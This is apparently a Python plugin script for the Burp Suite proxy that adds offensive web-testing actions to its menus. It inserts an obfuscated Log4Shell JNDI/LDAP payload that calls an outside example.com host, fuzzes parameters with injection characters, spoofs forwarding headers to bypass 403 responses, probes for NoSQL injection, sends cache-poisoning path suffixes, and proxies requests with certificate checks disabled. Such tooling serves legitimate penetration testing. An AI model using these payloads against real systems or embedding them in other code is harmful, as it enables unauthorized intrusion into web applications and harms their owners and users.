import json, copy
import urllib2, ssl, threading

pool = RequestPool(10)


def base64Encode(selectedText):
    return base64encode(selectedText)


def insertAtCursor():
    return "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//3s5npu.example.com:/a}"


def fuzzParamPerRequest(request):
    payload = "'\">"
    if request.contentType() == ContentType.JSON:
        for item in traverse_and_modify(json.loads(request.bodyToString().encode()), payload):
            pool.sendRequest(request.withBody(json.dumps(item)))
    for param in request.parameters():
        if param.type() == HttpParameterType.JSON:
            continue
        pool.sendRequest(request.withParameter(parameter(param.name(), param.value() + payload, param.type())))


def fuzzParamsOneRequest(request):
    payload = "'\">"
    if request.contentType() == ContentType.JSON:
        json_body = json.loads(request.bodyToString().encode())
        traverse_and_modify_all(json_body, payload)
        request = request.withBody(json.dumps(json_body))
    for param in request.parameters():
        if param.type() == HttpParameterType.JSON:
            continue
        request = request.withParameter(parameter(param.name(), param.value() + payload, param.type()))
    pool.sendRequest(request)


def bypass403(editor, request):
    editor.setRequest(request.withHeader("X-Forwarded-For", "127.0.0.1"). \
        withHeader("X-Originating-IP", "127.0.0.1").withHeader("X-Remote-IP", "127.0.0.1"). \
        withHeader("X-Remote-Addr", "127.0.0.1").withHeader("X-Real-IP", "127.0.0.1"). \
        withHeader("X-Forwarded-Host", "127.0.0.1").withHeader("X-Client-IP", "127.0.0.1"). \
        withHeader("X-Host", "127.0.0.1")
    )


def noSqliScan(request):
    if request.body().length() > 6 and request.contentType() == ContentType.JSON:
        for payload in traverse_and_modify(json.loads(request.bodyToString().encode()), {"$83b3j45b": "xxx"}):
            pool.sendRequest(request.withBody(json.dumps(payload)), noSqliScanCallBack)
    for param in request.parameters():
        ptype = param.type()
        if ptype == HttpParameterType.BODY or ptype == HttpParameterType.URL or ptype == HttpParameterType.COOKIE:
            pool.sendRequest(request.withRemovedParameters(param).withParameter(
                parameter(param.name() + "[$83b3j45b]", param.value(), ptype)), noSqliScanCallBack)


def noSqliScanCallBack(requestResponse):
    body = requestResponse.response().bodyToString()
    for highlight in ["unknown operator", "MongoError", "83b3j45b", "cannot be applied to a field", "expression is invalid"]:
        if highlight in body:
            addIssue("NoSQL Injection", "String detail", "String remediation", requestResponse.request().url(),
                     AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                     "String remediationBackground", AuditIssueSeverity.MEDIUM, requestResponse.withResponseMarkers(getResponseHighlights(requestResponse, highlight)))
            break


def registerContextMenu(menus):
    """
    To register a custom context menu using the register method,
    three parameters need to be passed: the menu name, the menu function, and the menu type.
    The menu types include CARET, SELECTED_TEXT, REQUEST, and EDIT_REQUEST.
    """
    menus.register("Base64 Encode", base64Encode, MenuType.SELECTED_TEXT)
    menus.register("Insert Log4j", insertAtCursor, MenuType.CARET)
    menus.register("FUZZ Param perReq", fuzzParamPerRequest, MenuType.REQUEST)
    menus.register("FUZZ Param oneReq", fuzzParamsOneRequest, MenuType.REQUEST)
    menus.register("Bypass 403", bypass403, MenuType.EDIT_REQUEST)
    menus.register("NOSQL Injection", noSqliScan, MenuType.REQUEST)
    menus.register("Send to Xray", sendRequestWithProxy, MenuType.REQUEST)
    menus.register("File Extension Cache Poison", cachePoison, MenuType.REQUEST)


def finish():
    pool.shutdown()


def cachePoison(request):
    for payload in ["%0d.css", "%0a.png", "%0a.json", "%0d.png", "%00.png", "%0d%0a.png"]:
        originPath = request.path()
        pool.sendRequest(request.withPath(originPath + payload))


# This code snippet is generated by OpenAI's ChatGPT language model.
def traverse_and_modify(node, new_value):
    result = []
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, (dict, list)):
                sub_results = traverse_and_modify(value, new_value)
                for sub_result in sub_results:
                    new_node = copy.deepcopy(node)
                    new_node[key] = sub_result
                    result.append(new_node)
            else:
                new_node = copy.deepcopy(node)
                new_node[key] = new_value
                result.append(new_node)
    elif isinstance(node, list):
        for i in range(len(node)):
            if isinstance(node[i], (dict, list)):
                sub_results = traverse_and_modify(node[i], new_value)
                for sub_result in sub_results:
                    new_node = copy.deepcopy(node)
                    new_node[i] = sub_result
                    result.append(new_node)
    else:
        result.append(node)
    return result


def traverse_and_modify_all(node, new_value):
    if isinstance(node, dict):
        for key, value in node.items():
            if isinstance(value, (dict, list)):
                traverse_and_modify_all(value, new_value)
            else:
                node[key] = new_value
    elif isinstance(node, list):
        for item in node:
            traverse_and_modify(item, new_value)


def sendRequestWithProxy(request):
    proxy = "127.0.0.1:9999"
    method = request.method().encode()
    url = request.url().encode()
    headers = {}
    for header in request.headers():
        if 'Accept-Encoding'.lower() == header.name().lower():
            headers.update({"Accept-Encoding": "deflate"})
            continue
        h = {header.name().encode(): header.value().encode()}
        headers.update(h)
    body = request.bodyToString().encode()
    thread = threading.Thread(target=send_request_with_proxy, args=(url, method, headers, body, proxy))
    thread.start()


def send_request_with_proxy(url, method, headers, body, proxy):
    # Set the proxy information
    proxy_handler = urllib2.ProxyHandler({'http': proxy, 'https': proxy})
    context = ssl._create_unverified_context()
    https_handler = urllib2.HTTPSHandler(context=context)
    opener = urllib2.build_opener(proxy_handler, https_handler)
    urllib2.install_opener(opener)
    # Create and send the request through the proxy
    request = urllib2.Request(url, data=body, headers=headers)
    request.get_method = lambda: method
    response = urllib2.urlopen(request, timeout=8)
#    print(response.read())
